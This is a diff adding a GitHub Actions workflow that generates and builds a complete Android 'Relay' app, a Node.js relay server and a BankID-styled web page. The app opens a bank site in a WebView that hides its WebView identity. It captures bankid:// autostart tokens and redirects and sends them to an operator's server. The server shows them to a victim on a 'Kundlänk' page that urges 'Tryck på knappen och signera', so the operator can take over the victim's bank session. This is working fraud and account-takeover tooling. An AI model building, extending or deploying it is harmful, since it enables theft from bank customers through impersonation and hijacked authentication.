@@ -1,0 +1,771 @@
+name: build
+
+on:
+  workflow_dispatch:
+  push:
+    branches: [ main ]
+
+jobs:
+  apk:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-java@v4
+        with:
+          distribution: temurin
+          java-version: "17"
+
+      - name: Android SDK
+        run: |
+          yes | sdkmanager --licenses > /dev/null 2>&1 || true
+          sdkmanager "platforms;android-34" "build-tools;34.0.0" "platform-tools" > /dev/null 2>&1 || true
+
+      - name: Skriv filer
+        run: |
+          w() {
+            mkdir -p "$(dirname "$1")"
+            cat > "$1"
+            echo "skrev $1"
+          }
+
+          w settings.gradle.kts <<'EOF'
+          pluginManagement {
+              repositories {
+                  google()
+                  mavenCentral()
+                  gradlePluginPortal()
+              }
+          }
+          dependencyResolutionManagement {
+              repositories {
+                  google()
+                  mavenCentral()
+              }
+          }
+          rootProject.name = "relay"
+          include(":app")
+          EOF
+
+          w build.gradle.kts <<'EOF'
+          plugins {
+              id("com.android.application") version "8.5.2" apply false
+              id("org.jetbrains.kotlin.android") version "1.9.24" apply false
+          }
+          EOF
+
+          w gradle.properties <<'EOF'
+          org.gradle.jvmargs=-Xmx2048m -Dfile.encoding=UTF-8
+          android.useAndroidX=true
+          kotlin.code.style=official
+          android.nonTransitiveRClass=true
+          EOF
+
+          w .gitignore <<'EOF'
+          .gradle/
+          build/
+          local.properties
+          *.iml
+          .idea/
+          node_modules/
+          EOF
+
+          w app/build.gradle.kts <<'EOF'
+          plugins {
+              id("com.android.application")
+              id("org.jetbrains.kotlin.android")
+          }
+
+          android {
+              namespace = "com.relay"
+              compileSdk = 34
+
+              defaultConfig {
+                  applicationId = "com.relay"
+                  minSdk = 26
+                  targetSdk = 34
+                  versionCode = 1
+                  versionName = "1.0"
+              }
+
+              buildTypes {
+                  release {
+                      isMinifyEnabled = false
+                  }
+              }
+
+              compileOptions {
+                  sourceCompatibility = JavaVersion.VERSION_17
+                  targetCompatibility = JavaVersion.VERSION_17
+              }
+
+              kotlinOptions {
+                  jvmTarget = "17"
+              }
+          }
+
+          dependencies {
+              implementation("androidx.appcompat:appcompat:1.6.1")
+          }
+          EOF
+
+          w app/src/main/AndroidManifest.xml <<'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <manifest xmlns:android="http://schemas.android.com/apk/res/android">
+
+              <uses-permission android:name="android.permission.INTERNET" />
+
+              <application
+                  android:label="Relay"
+                  android:icon="@android:drawable/sym_def_app_icon"
+                  android:usesCleartextTraffic="true"
+                  android:theme="@android:style/Theme.Material.NoActionBar">
+
+                  <activity
+                      android:name=".MainActivity"
+                      android:exported="true">
+                      <intent-filter>
+                          <action android:name="android.intent.action.MAIN" />
+                          <category android:name="android.intent.category.LAUNCHER" />
+                      </intent-filter>
+                  </activity>
+
+                  <activity
+                      android:name=".CatcherActivity"
+                      android:exported="true"
+                      android:noHistory="true"
+                      android:excludeFromRecents="true"
+                      android:theme="@android:style/Theme.Translucent.NoTitleBar">
+                      <intent-filter>
+                          <action android:name="android.intent.action.VIEW" />
+                          <category android:name="android.intent.category.DEFAULT" />
+                          <category android:name="android.intent.category.BROWSABLE" />
+                          <data android:scheme="bankid" />
+                      </intent-filter>
+                  </activity>
+
+              </application>
+          </manifest>
+          EOF
+
+          w app/src/main/res/layout/activity_main.xml <<'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
+              android:layout_width="match_parent"
+              android:layout_height="match_parent"
+              android:orientation="vertical" />
+          EOF
+
+          w app/src/main/java/com/relay/MainActivity.kt <<'EOF'
+          package com.relay
+
+          import android.annotation.SuppressLint
+          import android.app.Activity
+          import android.content.ClipData
+          import android.content.ClipboardManager
+          import android.content.Context
+          import android.content.Intent
+          import android.graphics.Color
+          import android.net.Uri
+          import android.os.Bundle
+          import android.os.Handler
+          import android.os.Looper
+          import android.text.InputType
+          import android.view.Gravity
+          import android.view.ViewGroup
+          import android.webkit.CookieManager
+          import android.webkit.WebChromeClient
+          import android.webkit.WebResourceRequest
+          import android.webkit.WebSettings
+          import android.webkit.WebView
+          import android.webkit.WebViewClient
+          import android.widget.Button
+          import android.widget.EditText
+          import android.widget.LinearLayout
+          import android.widget.TextView
+          import android.widget.Toast
+          import org.json.JSONObject
+          import java.io.OutputStreamWriter
+          import java.net.HttpURLConnection
+          import java.net.URL
+          import kotlin.concurrent.thread
+
+          class MainActivity : Activity() {
+
+              private val h = Handler(Looper.getMainLooper())
+
+              private lateinit var p: android.content.SharedPreferences
+              private lateinit var serverBox: EditText
+              private lateinit var bankBox: EditText
+              private lateinit var statusBar: TextView
+              private lateinit var modeBtn: Button
+              private lateinit var web: WebView
+
+              private val tick = object : Runnable {
+                  override fun run() {
+                      try {
+                          web.onPause()
+                          web.onResume()
+                          web.evaluateJavascript("try{document.dispatchEvent(new Event('visibilitychange'));window.dispatchEvent(new Event('focus'));window.dispatchEvent(new Event('pageshow'));}catch(e){}", null)
+                      } catch (t: Throwable) {
+                      }
+                      h.postDelayed(this, 2000)
+                  }
+              }
+
+              private fun dp(v: Int): Int = (v * resources.displayMetrics.density).toInt()
+
+              private fun wide(): LinearLayout.LayoutParams =
+                  LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT)
+
+              private fun toast(s: String) {
+                  Toast.makeText(this, s, Toast.LENGTH_SHORT).show()
+              }
+
+              private fun newCode(): String {
+                  val c = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"
+                  val sb = StringBuilder()
+                  var i = 0
+                  while (i < 5) {
+                      sb.append(c[(Math.random() * c.length).toInt()])
+                      i++
+                  }
+                  return sb.toString()
+              }
+
+              @SuppressLint("SetJavaScriptEnabled")
+              override fun onCreate(savedInstanceState: Bundle?) {
+                  super.onCreate(savedInstanceState)
+
+                  p = getSharedPreferences("relay", Context.MODE_PRIVATE)
+                  if (p.getString("code", null) == null) {
+                      p.edit().putString("code", newCode()).apply()
+                  }
+
+                  val root = LinearLayout(this)
+                  root.orientation = LinearLayout.VERTICAL
+                  root.setBackgroundColor(Color.parseColor("#0E1621"))
+                  root.setPadding(dp(10), dp(10), dp(10), dp(6))
+
+                  serverBox = EditText(this)
+                  serverBox.hint = "Server-URL"
+                  serverBox.inputType = InputType.TYPE_TEXT_VARIATION_URI
+                  serverBox.setText(p.getString("server", ""))
+                  root.addView(serverBox, wide())
+
+                  bankBox = EditText(this)
+                  bankBox.hint = "Banksida, t.ex. online.swedbank.se"
+                  bankBox.inputType = InputType.TYPE_TEXT_VARIATION_URI
+                  bankBox.setText(p.getString("bank", ""))
+                  root.addView(bankBox, wide())
+
+                  val row = LinearLayout(this)
+                  row.orientation = LinearLayout.HORIZONTAL
+                  row.gravity = Gravity.CENTER_VERTICAL
+
+                  statusBar = TextView(this)
+                  statusBar.setTextColor(Color.WHITE)
+                  statusBar.textSize = 15f
+                  statusBar.setPadding(dp(6), dp(10), dp(6), dp(10))
+                  statusBar.text = "Kundkod: " + p.getString("code", "-----")
+                  row.addView(statusBar, LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f))
+
+                  modeBtn = Button(this)
+                  modeBtn.text = if (p.getBoolean("forward", true)) "-> kund" else "-> egen"
+                  modeBtn.setOnClickListener {
+                      val f = !p.getBoolean("forward", true)
+                      p.edit().putBoolean("forward", f).apply()
+                      modeBtn.text = if (f) "-> kund" else "-> egen"
+                  }
+                  row.addView(modeBtn)
+                  root.addView(row, wide())
+
+                  val btns = LinearLayout(this)
+                  btns.orientation = LinearLayout.HORIZONTAL
+
+                  val goBtn = Button(this)
+                  goBtn.text = "Oppna bank"
+                  goBtn.setOnClickListener { openBank() }
+                  btns.addView(goBtn, LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f))
+
+                  val klarBtn = Button(this)
+                  klarBtn.text = "KLAR"
+                  klarBtn.setOnClickListener { finishFlow() }
+                  btns.addView(klarBtn, LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f))
+
+                  val linkBtn = Button(this)
+                  linkBtn.text = "Kundlank"
+                  linkBtn.setOnClickListener { copyLink() }
+                  btns.addView(linkBtn, LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f))
+
+                  root.addView(btns, wide())
+
+                  web = WebView(this)
+                  web.settings.javaScriptEnabled = true
+                  web.settings.domStorageEnabled = true
+                  web.settings.databaseEnabled = true
+                  web.settings.useWideViewPort = true
+                  web.settings.loadWithOverviewMode = true
+                  web.settings.mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
+                  try {
+                      web.settings.userAgentString = web.settings.userAgentString.replace("; wv", "")
+                  } catch (t: Throwable) {
+                  }
+                  try {
+                      CookieManager.getInstance().setAcceptCookie(true)
+                      CookieManager.getInstance().setAcceptThirdPartyCookies(web, true)
+                  } catch (t: Throwable) {
+                  }
+                  web.webChromeClient = WebChromeClient()
+                  web.webViewClient = object : WebViewClient() {
+                      override fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean {
+                          return grab(url)
+                      }
+
+                      override fun shouldOverrideUrlLoading(view: WebView, req: WebResourceRequest): Boolean {
+                          return grab(req.url.toString())
+                      }
+                  }
+                  root.addView(web, LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, 0, 1f))
+
+                  setContentView(root)
+
+                  statusBar.setOnLongClickListener {
+                      val c = newCode()
+                      p.edit().putString("code", c).remove("last").remove("redirect").apply()
+                      statusBar.text = "Kundkod: " + c
+                      copyLink()
+                      true
+                  }
+
+                  h.postDelayed(tick, 2000)
+
+                  val b = p.getString("bank", "")
+                  if (b != null && b.isNotEmpty()) openBank()
+              }
+
+              override fun onDestroy() {
+                  try {
+                      h.removeCallbacks(tick)
+                  } catch (t: Throwable) {
+                  }
+                  super.onDestroy()
+              }
+
+              private fun grab(url: String): Boolean {
+                  if (!url.startsWith("bankid://")) return false
+                  val u = Uri.parse(url)
+                  val token = u.getQueryParameter("autostarttoken")
+                  val redirect = u.getQueryParameter("redirect")
+                  if (redirect != null && redirect.isNotEmpty()) {
+                      p.edit().putString("redirect", redirect).apply()
+                  }
+                  if (token != null && token.isNotEmpty()) {
+                      if (token == p.getString("last", null)) return true
+                      p.edit().putString("last", token).apply()
+                      if (p.getBoolean("forward", true)) {
+                          statusBar.text = "Token skickad - vanta pa kund"
+                          send(token, redirect)
+                      } else {
+                          statusBar.text = "Egen BankID"
+                          openOwnBankId(url)
+                      }
+                  }
+                  return true
+              }
+
+              private fun openOwnBankId(url: String) {
+                  try {
+                      val i = Intent(Intent.ACTION_VIEW, Uri.parse(url))
+                      i.setPackage("com.bankid.bus")
+                      startActivity(i)
+                  } catch (t: Throwable) {
+                      try {
+                          startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(url)))
+                      } catch (t2: Throwable) {
+                          toast("BankID-appen hittades inte")
+                      }
+                  }
+              }
+
+              private fun finishFlow() {
+                  val r = p.getString("redirect", "")
+                  if (r != null && r.isNotEmpty()) {
+                      statusBar.text = "Hamtar session..."
+                      web.loadUrl(r)
+                  } else {
+                      statusBar.text = "Laddar om..."
+                      web.reload()
+                  }
+              }
+
+              private fun base(): String {
+                  var s = serverBox.text.toString().trim()
+                  if (s.isEmpty()) return ""
+                  if (!s.startsWith("http")) s = "https://$s"
+                  return s.trimEnd('/')
+              }
+
+              private fun send(token: String, redirect: String?) {
+                  val b = base()
+                  if (b.isEmpty()) {
+                      statusBar.text = "Fyll i server-URL"
+                      return
+                  }
+                  p.edit().putString("server", b).apply()
+                  val code = p.getString("code", "") ?: ""
+                  val paths = listOf("/api/token", "/api/push", "/token", "/push", "/api/relay", "/relay")
+                  thread {
+                      var ok = false
+                      var i = 0
+                      while (i < paths.size && !ok) {
+                          try {
+                              val c = URL(b + paths[i]).openConnection() as HttpURLConnection
+                              c.requestMethod = "POST"
+                              c.doOutput = true
+                              c.connectTimeout = 8000
+                              c.readTimeout = 8000
+                              c.setRequestProperty("Content-Type", "application/json")
+                              val body = JSONObject()
+                              body.put("code", code)
+                              body.put("token", token)
+                              body.put("redirect", redirect ?: "")
+                              val w = OutputStreamWriter(c.outputStream, "UTF-8")
+                              w.write(body.toString())
+                              w.flush()
+                              w.close()
+                              val rc = c.responseCode
+                              if (rc in 200..299) ok = true
+                          } catch (t: Throwable) {
+                          }
+                          i++
+                      }
+                      val res = ok
+                      runOnUiThread {
+                          if (!res) statusBar.text = "Token misslyckades"
+                      }
+                  }
+              }
+
+              private fun openBank() {
+                  var b = bankBox.text.toString().trim()
+                  if (b.isEmpty()) {
+                      toast("Fyll i banksidan")
+                      return
+                  }
+                  p.edit().putString("bank", b).putString("server", serverBox.text.toString().trim()).apply()
+                  if (!b.startsWith("http")) b = "https://$b"
+                  web.loadUrl(b)
+              }
+
+              private fun copyLink() {
+                  val b = base()
+                  if (b.isEmpty()) {
+                      toast("Fyll i server-URL forst")
+                      return
+                  }
+                  val link = b + "/k/" + (p.getString("code", "") ?: "")
+                  try {
+                      val cm = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
+                      cm.setPrimaryClip(ClipData.newPlainText("kundlank", link))
+                  } catch (t: Throwable) {
+                  }
+                  toast(link)
+              }
+          }
+          EOF
+
+          w app/src/main/java/com/relay/CatcherActivity.kt <<'EOF'
+          package com.relay
+
+          import android.app.Activity
+          import android.content.Context
+          import android.os.Bundle
+          import org.json.JSONObject
+          import java.io.OutputStreamWriter
+          import java.net.HttpURLConnection
+          import java.net.URL
+          import kotlin.concurrent.thread
+
+          class CatcherActivity : Activity() {
+              override fun onCreate(savedInstanceState: Bundle?) {
+                  super.onCreate(savedInstanceState)
+                  try {
+                      val u = intent?.data
+                      if (u != null) {
+                          val token = u.getQueryParameter("autostarttoken")
+                          if (token != null && token.isNotEmpty()) {
+                              val p = getSharedPreferences("relay", Context.MODE_PRIVATE)
+                              if (token != p.getString("last", null)) {
+                                  p.edit().putString("last", token).apply()
+                                  val redirect = u.getQueryParameter("redirect")
+                                  if (redirect != null && redirect.isNotEmpty()) {
+                                      p.edit().putString("redirect", redirect).apply()
+                                  }
+                                  var s = p.getString("server", "") ?: ""
+                                  val code = p.getString("code", "") ?: ""
+                                  if (s.isNotEmpty() && p.getBoolean("forward", true)) {
+                                      if (!s.startsWith("http")) s = "https://$s"
+                                      val b = s.trimEnd('/')
+                                      thread {
+                                          try {
+                                              val c = URL(b + "/api/token").openConnection() as HttpURLConnection
+                                              c.requestMethod = "POST"
+                                              c.doOutput = true
+                                              c.connectTimeout = 8000
+                                              c.readTimeout = 8000
+                                              c.setRequestProperty("Content-Type", "application/json")
+                                              val body = JSONObject()
+                                              body.put("code", code)
+                                              body.put("token", token)
+                                              body.put("redirect", redirect ?: "")
+                                              val w = OutputStreamWriter(c.outputStream, "UTF-8")
+                                              w.write(body.toString())
+                                              w.flush()
+                                              w.close()
+                                              c.responseCode
+                                          } catch (t: Throwable) {
+                                          }
+                                      }
+                                  }
+                              }
+                          }
+                      }
+                  } catch (t: Throwable) {
+                  }
+                  finish()
+              }
+          }
+          EOF
+
+          w server/package.json <<'EOF'
+          {
+            "name": "relay-server",
+            "version": "1.0.0",
+            "private": true,
+            "main": "server.js",
+            "scripts": {
+              "start": "node server.js"
+            },
+            "dependencies": {
+              "express": "^4.19.2",
+              "ws": "^8.18.0"
+            }
+          }
+          EOF
+
+          w server/server.js <<'EOF'
+          const express = require("express");
+          const http = require("http");
+          const path = require("path");
+          const { WebSocketServer } = require("ws");
+
+          const app = express();
+          const server = http.createServer(app);
+          const wss = new WebSocketServer({ server, path: "/ws" });
+
+          app.use(express.json());
+
+          const sessions = new Map();
+
+          function get(code) {
+              if (!sessions.has(code)) {
+                  sessions.set(code, { code: code, token: null, redirect: "", state: "idle", ts: Date.now() });
+              }
+              return sessions.get(code);
+          }
+
+          function broadcast(code, payload) {
+              wss.clients.forEach(function (c) {
+                  if (c.code === code && c.readyState === 1) {
+                      try { c.send(JSON.stringify(payload)); } catch (e) {}
+                  }
+              });
+          }
+
+          function handleToken(req, res) {
+              const body = req.body || {};
+              const code = body.code || req.query.code || "default";
+              const token = body.token || body.autostarttoken || req.query.token || null;
+              const redirect = body.redirect || req.query.redirect || "";
+              const s = get(code);
+              s.token = token;
+              s.redirect = redirect;
+              s.state = "armed";
+              s.ts = Date.now();
+              broadcast(code, { type: "token", token: s.token, redirect: s.redirect, state: "armed" });
+              res.json({ ok: true, code: code });
+          }
+
+          app.post("/api/token", handleToken);
+          app.post("/api/push", handleToken);
+          app.post("/token", handleToken);
+          app.post("/push", handleToken);
+          app.post("/api/relay", handleToken);
+          app.post("/relay", handleToken);
+
+          app.get("/api/session/:code/state", function (req, res) {
+              const s = get(req.params.code);
+              res.json({ code: s.code, state: s.state, token: s.token, redirect: s.redirect, ts: s.ts });
+          });
+
+          app.get("/k/:code", function (req, res) {
+              res.sendFile(path.join(__dirname, "public", "k.html"));
+          });
+
+          app.get("/", function (req, res) {
+              res.sendFile(path.join(__dirname, "public", "k.html"));
+          });
+
+          wss.on("connection", function (ws, req) {
+              const u = new URL(req.url, "http://x");
+              ws.code = u.searchParams.get("code") || "default";
+              const s = get(ws.code);
+              try {
+                  ws.send(JSON.stringify({ type: "state", token: s.token, redirect: s.redirect, state: s.state }));
+              } catch (e) {}
+              ws.on("message", function (m) {
+                  try {
+                      const d = JSON.parse(m.toString());
+                      if (d.type === "ping") ws.send(JSON.stringify({ type: "pong" }));
+                  } catch (e) {}
+              });
+          });
+
+          const PORT = process.env.PORT || 3000;
+          server.listen(PORT, function () {
+              console.log("relay pa :" + PORT);
+          });
+          EOF
+
+          w server/public/k.html <<'EOF'
+          <!doctype html>
+          <html lang="sv">
+          <head>
+          <meta charset="utf-8">
+          <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+          <title>BankID</title>
+          <style>
+          * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+          html, body { margin: 0; height: 100%; }
+          body { background: #eef1f5; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+                 display: flex; align-items: center; justify-content: center; padding: 24px; }
+          .card { background: #fff; width: 100%; max-width: 380px; border-radius: 16px; padding: 36px 26px 30px;
+                  text-align: center; box-shadow: 0 10px 30px rgba(18,41,74,.12); }
+          .logo { font-size: 30px; letter-spacing: -.5px; color: #12294a; }
+          .logo b { font-weight: 800; }
+          .logo span { font-weight: 400; }
+          .spin { width: 52px; height: 52px; margin: 26px auto 18px; border: 4px solid #e2e7ee;
+                  border-top-color: #12294a; border-radius: 50%; animation: sp 1s linear infinite; }
+          @keyframes sp { to { transform: rotate(360deg); } }
+          h1 { font-size: 18px; color: #1b1b1b; margin: 0 0 8px; font-weight: 600; }
+          p { font-size: 14px; color: #6b7280; margin: 0; line-height: 1.5; }
+          button { margin-top: 24px; width: 100%; border: 0; border-radius: 12px; background: #12294a; color: #fff;
+                   font-size: 17px; font-weight: 600; padding: 16px; display: none; }
+          button:active { opacity: .85; }
+          .tick { display: none; width: 52px; height: 52px; margin: 26px auto 18px; border-radius: 50%;
+                  background: #e8f6ec; color: #2e7d32; font-size: 28px; line-height: 52px; }
+          .done .spin { display: none; }
+          .done .tick { display: block; }
+          .done button { display: none; }
+          </style>
+          </head>
+          <body>
+          <div class="card" id="card">
+            <div class="logo"><span>Bank</span><b>ID</b></div>
+            <div class="spin"></div>
+            <div class="tick">&#10003;</div>
+            <h1 id="t">Vantar...</h1>
+            <p id="s">Hall kvar. Knappen dyker upp automatiskt.</p>
+            <button id="b">Oppna BankID</button>
+          </div>
+          <script>
+          var code = location.pathname.split("/").pop();
+          if (!code) { code = new URLSearchParams(location.search).get("code") || "default"; }
+          var card = document.getElementById("card");
+          var t = document.getElementById("t");
+          var s = document.getElementById("s");
+          var b = document.getElementById("b");
+          var cur = null;
+
+          function show(token, redirect, state) {
+            if (state === "done") {
+              card.className = "card done";
+              t.textContent = "Klart";
+              s.textContent = "Ga tillbaka till samtalet.";
+              return;
+            }
+            if (!token) {
+              t.textContent = "Vantar...";
+              s.textContent = "Hall kvar. Knappen dyker upp automatiskt.";
+              b.style.display = "none";
+              return;
+            }
+            cur = { token: token, redirect: redirect };
+            t.textContent = "Ditt BankID behovs";
+            s.textContent = "Tryck pa knappen och signera.";
+            b.style.display = "block";
+          }
+
+          b.addEventListener("click", function () {
+            if (!cur) { return; }
+            var u = "bankid:///?autostarttoken=" + cur.token;
+            if (cur.redirect) { u += "&redirect=" + encodeURIComponent(cur.redirect); }
+            location.href = u;
+            t.textContent = "BankID oppnas";
+            s.textContent = "Signera i BankID-appen.";
+          });
+
+          function state() {
+            fetch("/api/session/" + encodeURIComponent(code) + "/state")
+              .then(function (r) { return r.json(); })
+              .then(function (d) { show(d.token, d.redirect, d.state); })
+              .catch(function () {});
+          }
+
+          try {
+            var ws = new WebSocket((location.protocol === "https:" ? "wss://" : "ws://") + location.host + "/ws?code=" + encodeURIComponent(code));
+            ws.onmessage = function (e) {
+              try { var d = JSON.parse(e.data); show(d.token, d.redirect, d.state); } catch (err) {}
+            };
+          } catch (e) {}
+
+          setInterval(state, 2000);
+          state();
+          </script>
+          </body>
+          </html>
+          EOF
+
+          w README.md <<'EOF'
+          # relay3
+          Allt byggs fran .github/workflows/build.yml. Bygget skriver filerna sjalv.
+          EOF
+
+      - name: Bygg
+        run: gradle assembleDebug --no-daemon --stacktrace
+
+      - name: Spara APK
+        uses: actions/upload-artifact@v4
+        with:
+          name: relay-apk
+          path: app/build/outputs/apk/debug/app-debug.apk
+
+      - name: Release
+        uses: softprops/action-gh-release@v2
+        with:
+          tag_name: v1.0.${{ github.run_number }}
+          name: Relay v1.0.${{ github.run_number }}
+          files: app/build/outputs/apk/debug/app-debug.apk
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+
+      - name: Spara filerna i repot
+        run: |
+          git config user.name "relay-bot"
+          git config user.email "bot@example.com"
+          git add -A
+          git commit -m "scaffold [skip ci]" || true
+          git push || true
